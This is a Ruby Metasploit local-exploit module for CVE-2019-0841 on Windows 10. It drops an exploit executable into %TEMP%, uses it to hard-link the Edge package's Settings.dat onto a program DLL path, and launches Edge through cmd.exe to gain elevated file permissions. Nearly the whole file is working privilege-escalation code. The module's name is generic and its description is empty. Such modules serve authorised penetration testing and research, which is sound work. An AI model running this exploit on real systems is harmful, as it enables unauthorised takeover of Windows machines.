##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Exploit::EXE
  include Post::File
  include Post::Windows::Priv

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Sample Exploit',
      'Description'    => %q(
      ),
      'License'        => MSF_LICENSE,
      'Author'         =>
      [
        'Nabeel Ahmed',      # Vulnerability discovery and PoC
        'James Forshaw',     # Hard link code
        'Shelby Pace'        # Metasploit module
      ],
      'References'     =>
        [
          [ 'CVE', '2019-0841' ],
          [ 'URL', 'https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/' ],
          [ 'URL', 'https://googleprojectzero.blogspot.com/2015/12/between-rock-and-hard-link.html' ]
        ],
      'Targets'        =>
        [
          [ 'Windows 10', { 'Platform' => 'win' } ]
        ],
      'DisclosureDate' => '2019-04-09',
      'DefaultTarget'  => 0
    ))

    register_options(
    [
      OptString.new('SRC_PATH', [ false, 'The settings.dat file to use', 'Microsoft.MicrosoftEdge_8wekyb3d8bbwe' ]),
      OptString.new('PROCESS', [ false, 'The executable to open', 'start microsoft-edge:' ])
    ])
  end

  def validate_target
    fail_with(Failure::None, 'Already running with SYSTEM privileges') if is_system?

    fail_with(Failure::NoTarget, 'The target is not running Windows') unless session.platform == 'windows'
  end

  def write_to_disk
    link_file_name = expand_path("%TEMP%\\#{Rex::Text.rand_text_alpha(6...8)}.exe")
    if session.arch == ARCH_X86
      exe_name = 'CVE-2019-0841_x86.exe'
    elsif session.arch == ARCH_X64
      exe_name = 'CVE-2019-0841_x64.exe'
    end
    contents = File.read(File.join(Msf::Config.data_directory, 'exploits', 'CVE-2019-0841', exe_name))
    write_file(link_file_name, contents)
    link_file_name
  rescue
    fail_with(Failure::UnexpectedReply, 'Failed to write file contents to target')
  end

  def init_process
    print_status("Attempting to launch process: #{datastore['PROCESS']}")
    cmd_exec("cmd.exe /c #{datastore['PROCESS']}")
  end

  def mk_hard_link(src, target, link_exe)
    out = cmd_exec("cmd.exe /c #{link_exe} \"#{src}\" \"#{target}\"")
    return true if out && out.include?('Done')

    false
  end

  def exploit
    dat_path = expand_path("%USERPROFILE%\\AppData\\Local\\Packages\\#{datastore['SRC_PATH']}\\Settings\\Settings.dat")
    validate_target
    hard_link_exe = write_to_disk

    placeholder = expand_path("%PROGRAMFILES(x86)%\\Notepad++\\plugins\\NppExport\\NppExport.dll")
    fail_with(Failure::UnexpectedReply, 'Did not retrieve expected output') unless mk_hard_link(dat_path, placeholder, hard_link_exe)
    print_good('Successfully created hard link')
    init_process
  end
end
